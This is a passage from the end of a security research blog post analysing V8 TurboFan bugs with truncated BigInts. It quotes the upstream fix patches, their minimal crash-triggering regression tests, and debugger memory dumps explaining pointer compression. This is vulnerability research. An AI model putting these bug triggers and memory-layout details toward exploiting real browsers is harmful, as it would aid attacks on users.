<span class="gi">+          EnqueueInput(node, i, UseInfo::AnyTagged());</span>
<span class="gi">+        } else {</span>
<span class="gi">+          EnqueueInput(node, i, UseInfo::Any());</span>
<span class="gi">+        }</span>
       }
     } else if (lower()) {
       Zone* zone = jsgraph_-&gt;zone();
<span class="gu">@@ -1265,6 +1271,11 @@</span>
         Node* input = node-&gt;InputAt(i);
         (*types)[i] =
             DeoptMachineTypeOf(GetInfo(input)-&gt;representation(), TypeOf(input));
<span class="gi">+        // TODO(nicohartmann): Remove, once the deoptimizer can rematerialize</span>
<span class="gi">+        // truncated BigInts.</span>
<span class="gi">+        if (TypeOf(node-&gt;InputAt(i)).Is(Type::BigInt())) {</span>
<span class="gi">+          ConvertInput(node, i, UseInfo::AnyTagged());</span>
<span class="gi">+        }</span>
       }
       NodeProperties::ChangeOp(node, jsgraph_-&gt;common()-&gt;TypedObjectState(
                                          ObjectIdOf(node-&gt;op()), types));
<span class="gh">diff --git a/test/mjsunit/regress/regress-1028191.js b/test/mjsunit/regress/regress-1028191.js</span>
new file mode 100644
<span class="gh">index 0000000..543028a</span>
<span class="gd">--- /dev/null</span>
<span class="gi">+++ b/test/mjsunit/regress/regress-1028191.js</span>
<span class="gu">@@ -0,0 +1,23 @@</span>
<span class="gi">+// Copyright 2019 the V8 project authors. All rights reserved.</span>
<span class="gi">+// Use of this source code is governed by a BSD-style license that can be</span>
<span class="gi">+// found in the LICENSE file.</span>
<span class="gi">+</span>
<span class="gi">+// Flags: --allow-natives-syntax</span>
<span class="gi">+</span>
<span class="gi">+&quot;use strict&quot;;</span>
<span class="gi">+</span>
<span class="gi">+function f(a, b, c) {</span>
<span class="gi">+  let x = BigInt.asUintN(64, a + b);</span>
<span class="gi">+  try {</span>
<span class="gi">+    x + c;</span>
<span class="gi">+  } catch(_) {</span>
<span class="gi">+    eval();</span>
<span class="gi">+  }</span>
<span class="gi">+  return x;</span>
<span class="gi">+}</span>
<span class="gi">+</span>
<span class="gi">+%PrepareFunctionForOptimization(f);</span>
<span class="gi">+assertEquals(f(3n, 5n), 8n);</span>
<span class="gi">+assertEquals(f(8n, 12n), 20n);</span>
<span class="gi">+%OptimizeFunctionOnNextCall(f);</span>
<span class="gi">+assertEquals(f(2n, 3n), 5n);</span>
</code></pre></div>

<p>Interestingly, <a href="https://chromium-review.googlesource.com/c/v8/v8/+/1962278">other bugs</a> in the representation changers got triggered by very similars PoCs. The fix simply adds a call to <code>InsertConversion</code> so as to insert a <code>ChangeUint64ToBigInt</code> node when necessary.</p>
<div class="highlight"><pre><span></span><code>From 8aa588976a1c4e593f0074332f5b1f7020656350 Mon Sep 17 00:00:00 2001
From: Nico Hartmann &lt;nicohartmann@chromium.org&gt;
Date: Thu, 12 Dec 2019 10:06:19 +0100
Subject: [PATCH] [turbofan] Fixes rematerialization of truncated BigInts

Bug: chromium:1029530
Change-Id: I12aa4c238387f6a47bf149fd1a136ea83c385f4b
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/1962278
Auto-Submit: Nico Hartmann &lt;nicohartmann@chromium.org&gt;
Commit-Queue: Georg Neis &lt;neis@chromium.org&gt;
Reviewed-by: Georg Neis &lt;neis@chromium.org&gt;
Cr-Commit-Position: refs/heads/master@{#65434}
<span class="gd">---</span>

<span class="gh">diff --git a/src/compiler/representation-change.cc b/src/compiler/representation-change.cc</span>
<span class="gh">index 99b3d64..9478e15 100644</span>
<span class="gd">--- a/src/compiler/representation-change.cc</span>
<span class="gi">+++ b/src/compiler/representation-change.cc</span>
<span class="gu">@@ -175,6 +175,15 @@</span>
     }
   }

<span class="gi">+  // Rematerialize any truncated BigInt if user is not expecting a BigInt.</span>
<span class="gi">+  if (output_type.Is(Type::BigInt()) &amp;&amp;</span>
<span class="gi">+      output_rep == MachineRepresentation::kWord64 &amp;&amp;</span>
<span class="gi">+      use_info.type_check() != TypeCheckKind::kBigInt) {</span>
<span class="gi">+    node =</span>
<span class="gi">+        InsertConversion(node, simplified()-&gt;ChangeUint64ToBigInt(), use_node);</span>
<span class="gi">+    output_rep = MachineRepresentation::kTaggedPointer;</span>
<span class="gi">+  }</span>
<span class="gi">+</span>
   switch (use_info.representation()) {
     case MachineRepresentation::kTaggedSigned:
       DCHECK(use_info.type_check() == TypeCheckKind::kNone ||
<span class="gh">diff --git a/test/mjsunit/regress/regress-1029530.js b/test/mjsunit/regress/regress-1029530.js</span>
new file mode 100644
<span class="gh">index 0000000..918a9ec</span>
<span class="gd">--- /dev/null</span>
<span class="gi">+++ b/test/mjsunit/regress/regress-1029530.js</span>
<span class="gu">@@ -0,0 +1,40 @@</span>
<span class="gi">+// Copyright 2019 the V8 project authors. All rights reserved.</span>
<span class="gi">+// Use of this source code is governed by a BSD-style license that can be</span>
<span class="gi">+// found in the LICENSE file.</span>
<span class="gi">+</span>
<span class="gi">+// Flags: --allow-natives-syntax --interrupt-budget=1024</span>
<span class="gi">+</span>
<span class="gi">+{</span>
<span class="gi">+  function f() {</span>
<span class="gi">+    const b = BigInt.asUintN(4,3n);</span>
<span class="gi">+    let i = 0;</span>
<span class="gi">+    while(i &lt; 1) {</span>
<span class="gi">+      i + 1;</span>
<span class="gi">+      i = b;</span>
<span class="gi">+    }</span>
<span class="gi">+  }</span>
<span class="gi">+</span>
<span class="gi">+  %PrepareFunctionForOptimization(f);</span>
<span class="gi">+  f();</span>
<span class="gi">+  f();</span>
<span class="gi">+  %OptimizeFunctionOnNextCall(f);</span>
<span class="gi">+  f();</span>
<span class="gi">+}</span>
<span class="gi">+</span>
<span class="gi">+</span>
<span class="gi">+{</span>
<span class="gi">+  function f() {</span>
<span class="gi">+    const b = BigInt.asUintN(4,10n);</span>
<span class="gi">+    let i = 0.1;</span>
<span class="gi">+    while(i &lt; 1.8) {</span>
<span class="gi">+      i + 1;</span>
<span class="gi">+      i = b;</span>
<span class="gi">+    }</span>
<span class="gi">+  }</span>
<span class="gi">+</span>
<span class="gi">+  %PrepareFunctionForOptimization(f);</span>
<span class="gi">+  f();</span>
<span class="gi">+  f();</span>
<span class="gi">+  %OptimizeFunctionOnNextCall(f);</span>
<span class="gi">+  f();</span>
<span class="gi">+}</span>
</code></pre></div>

<p>An <a href="https://chromium-review.googlesource.com/c/v8/v8/+/1948711">inlining bug</a> was also patched. Indeed, a call to <code>BigInt.asUintN</code> would get inlined even when no value argument is given (as in <code>BigInt.asUintN(bits,no_value_argument_here)</code>). Therefore a call to <code>GetValueInput</code> would be made on a non-existing input! The fix simply adds a check on the number of inputs.</p>
<div class="highlight"><pre><span></span><code><span class="n">Node</span><span class="o">*</span> <span class="n">value</span> <span class="o">=</span> <span class="n">NodeProperties</span><span class="o">::</span><span class="n">GetValueInput</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="mi">3</span><span class="p">);</span> <span class="c1">// input 3 may not exist!</span>
</code></pre></div>

<p>An interesting fact to point out is that none of those PoCs would actually correctly execute. They would trigger exceptions that need to get caught. This leads to interesting behaviours from TurboFan that optimizes 'invalid' code.</p>
<h3 id="digression-on-pointer-compression">Digression on pointer compression</h3>
<p>In our small experiments, we used standard tagged pointers. To distinguish small integers (Smis) from heap objects, V8 uses the lowest bit of an object address.</p>
<p>Up until V8 8.0, it looks like this : </p>
<div class="highlight"><pre><span></span><code>Smi:                   [32 bits] [31 bits (unused)]  |  0
Strong HeapObject:                        [pointer]  | 01
Weak HeapObject:                          [pointer]  | 11
</code></pre></div>

<p>However, with V8 8.0 comes <a href="https://v8.dev/blog/v8-release-80#pointer-compression">pointer compression</a>. It is going to be shipped with the upcoming M80 stable release. Starting from this version, Smis and compressed pointers are stored as 32-bit values : </p>
<div class="highlight"><pre><span></span><code>Smi:                                      [31 bits]  |  0
Strong HeapObject:                        [30 bits]  | 01
Weak HeapObject:                          [30 bits]  | 11
</code></pre></div>

<p>As described in the <a href="https://docs.google.com/document/d/10qh2-b4C5OtSg-xLwyZpEI5ZihVBPtn1xwKBbQC26yI/edit#heading=h.oi5ry2ou2og2">design document</a>, a compressed pointer corresponds to the first 32-bits of a pointer to which we add a base address when decompressing.</p>
<p>Let's quickly have a look by inspecting the memory ourselves. Note that DebugPrint displays uncompressed pointers.</p>
<div class="highlight"><pre><span></span><code>d8&gt; var a = new Array(1,2,3,4)
undefined
d8&gt; %DebugPrint(a)
DebugPrint: 0x16a4080c5f61: [JSArray]
 - map: 0x16a4082817e9 &lt;Map(PACKED_SMI_ELEMENTS)&gt; [FastProperties]
 - prototype: 0x16a408248f25 &lt;JSArray[0]&gt;
 - elements: 0x16a4080c5f71 &lt;FixedArray[4]&gt; [PACKED_SMI_ELEMENTS]
 - length: 4
 - properties: 0x16a4080406e1 &lt;FixedArray[0]&gt; {
    #length: 0x16a4081c015d &lt;AccessorInfo&gt; (const accessor descriptor)
 }
 - elements: 0x16a4080c5f71 &lt;FixedArray[4]&gt; {
           0: 1
           1: 2
           2: 3
           3: 4
 }
</code></pre></div>

<p>If we look in memory, we'll actually find compressed pointers, which are 32-bit values.</p>
<div class="highlight"><pre><span></span><code>(lldb) x/10wx 0x16a4080c5f61-1
0x16a4080c5f60: 0x082817e9 0x080406e1 0x080c5f71 0x00000008
0x16a4080c5f70: 0x080404a9 0x00000008 0x00000002 0x00000004
0x16a4080c5f80: 0x00000006 0x00000008
</code></pre></div>

<p>To get the full address, we need to know the base. </p>
<div class="highlight"><pre><span></span><code>(lldb) register read r13
     r13 = 0x000016a400000000
</code></pre></div>

<p>And we can manually uncompress a pointer by doing <code>base+compressed_pointer</code> (and obviously we substract 1 to untag the pointer).</p>
<div class="highlight"><pre><span></span><code>(lldb) x/10wx $r13+0x080c5f71-1
0x16a4080c5f70: 0x080404a9 0x00000008 0x00000002 0x00000004
0x16a4080c5f80: 0x00000006 0x00000008 0x08040549 0x39dc599e
0x16a4080c5f90: 0x00000adc 0x7566280a
</code></pre></div>

<p>Because now on a 64-bit build Smis are on 32-bits with the lsb set to 0, we need to shift their values by one.</p>
<p>Also, raw pointers are supported. An example of raw pointer is the backing store pointer of an array buffer.</p>
<div class="highlight"><pre><span></span><code>d8&gt; var a = new ArrayBuffer(0x40); 
d8&gt; var v = new Uint32Array(a);
d8&gt; v[0] = 0x41414141
</code></pre></div>

<div class="highlight"><pre><span></span><code>d8&gt; %DebugPrint(a)
DebugPrint: 0x16a4080c7899: [JSArrayBuffer]
 - map: 0x16a408281181 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]
 - prototype: 0x16a4082476f5 &lt;Object map = 0x16a4082811a9&gt;
 - elements: 0x16a4080406e1 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]
 - embedder fields: 2
 - backing_store: 0x107314fd0
 - byte_length: 64
 - detachable
 - properties: 0x16a4080406e1 &lt;FixedArray[0]&gt; {}
 - embedder fields = {
    0, aligned pointer: 0x0
    0, aligned pointer: 0x0
 }
</code></pre></div>

<div class="highlight"><pre><span></span><code>(lldb) x/10wx 0x16a4080c7899-1
0x16a4080c7898: 0x08281181 0x080406e1 0x080406e1 0x00000040
0x16a4080c78a8: 0x00000000 0x07314fd0 0x00000001 0x00000002
0x16a4080c78b8: 0x00000000 0x00000000
</code></pre></div>

<p>We indeed find the full raw pointer in memory (<code>raw | 00</code>).</p>
<div class="highlight"><pre><span></span><code>(lldb) x/2wx 0x0000000107314fd0
0x107314fd0: 0x41414141 0x00000000
</code></pre></div>

<h1 id="conclusion">Conclusion</h1>
<p>We went through various components of V8 in this article such as Ignition, TurboFan's simplified lowering phase as well as how deoptimization works. Understanding this is interesting because it allows us to grasp the actual underlying root cause of the bug we studied. At first, the base trigger looks very simple but it actually involves quite a few interesting mechanisms.</p>
<p>However, even though this bug gives a very interesting primitive, unfortunately it does not provide any good infoleak primitive. Therefore, it would need to be combined with another bug (obviously, we don't want to use any kind of heap spraying).</p>
<p>Special thanks to my mates <a href="https://twitter.com/0vercl0k">Axel Souchet</a>, <a href="https://twitter.com/dougallj">Dougall J</a>, Bill K, <a href="https://twitter.com/yrp604">yrp604</a> and <a href="https://twitter.com/mdowd">Mark Dowd</a> for reviewing this article and kudos to the V8 team for building such an amazing JavaScript engine!</p>
<p>Please feel free to <a href="https://twitter.com/__x86">contact me on twitter</a> if you've got any feedback or question! </p>
<p>Also, my team at <a href="https://twitter.com/azimuthsecurity"><code>Trenchant aka Azimuth Security</code></a> is hiring so don't hesitate to reach out if you're interested :) (DMs are open, otherwise <code>jf at company dot com</code> with <code>company</code> being <code>azimuthsecurity</code>) </p>
<h1 id="references">References</h1>
<h3 id="technical-documents">Technical documents</h3>
<ul>
<li><a href="https://v8.dev/docs/">V8's documentation</a></li>
<li><a href="https://benediktmeurer.de/publications/">Benedikt Meurer's publications</a></li>
<li><a href="https://ripsawridge.github.io/">Michael Stanton's blog</a></li>
<li><a href="https://docs.google.com/presentation/d/1Z6oCocRASCfTqGq1GCo1jbULDGS-w-nzxkbVF7Up0u0/edit#slide=id.p">Deoptimization in V8</a></li>
<li><a href="https://doar-e.github.io/blog/2019/01/28/introduction-to-turbofan/">An introduction to TurboFan</a></li>
<li><a href="https://doar-e.github.io/presentations/typhooncon2019/AttackingTurboFan_TyphoonCon_2019.pdf">Attacking TurboFan - TyphoonCon 2019 talk</a></li>
</ul>
<h3 id="bugs">Bugs</h3>
<ul>
<li><a href="https://chromium-review.googlesource.com/c/v8/v8/+/1873692">BUG 1016450 - Fixes word64-lowered BigInt in FrameState accumulator</a></li>
<li><a href="https://chromium-review.googlesource.com/c/v8/v8/+/1936468">BUG 1028191 - Fixes crash caused by truncated bigint</a></li>
<li><a href="https://chromium-review.googlesource.com/c/v8/v8/+/1962278">BUG 1029530 - Fixes rematerialization of truncated BigInts</a></li>
<li><a href="https://chromium-review.googlesource.com/c/v8/v8/+/1948711">BUG 1029576 - Fixes crash on missing BigInt.asUintN argument</a></li>
</ul>
                </div><!-- /.entry-content -->
        </article>
</section>
        </div><!--/span-->
      </div><!--/row-->
      <hr>

      <footer style='background-color:#00000000'>
        <center>
          <address id="about">
                  Proudly powered by <a href="http://pelican.notmyidea.org/">Pelican <i class="icon-external-link"></i></a>,
                                  which takes great advantage of <a href="http://python.org">Python <i class="icon-external-link"></i></a>.
          </address><!-- /#about -->

          <p>The theme is from <a href="http://twitter.github.com/bootstrap/">Bootstrap from Twitter <i class="icon-external-link"></i></a>,
                     and <a href="http://fortawesome.github.com/Font-Awesome/">Font-Awesome <i class="icon-external-link"></i></a>, thanks!</p>
        </center>
      </footer>

    </div><!--/.fluid-container-->


    <script src="../../../../../theme/js/jquery-1.7.2.min.js"></script>
    <script src="../../../../../theme/js/bootstrap.min.js"></script>
  </body>
</html>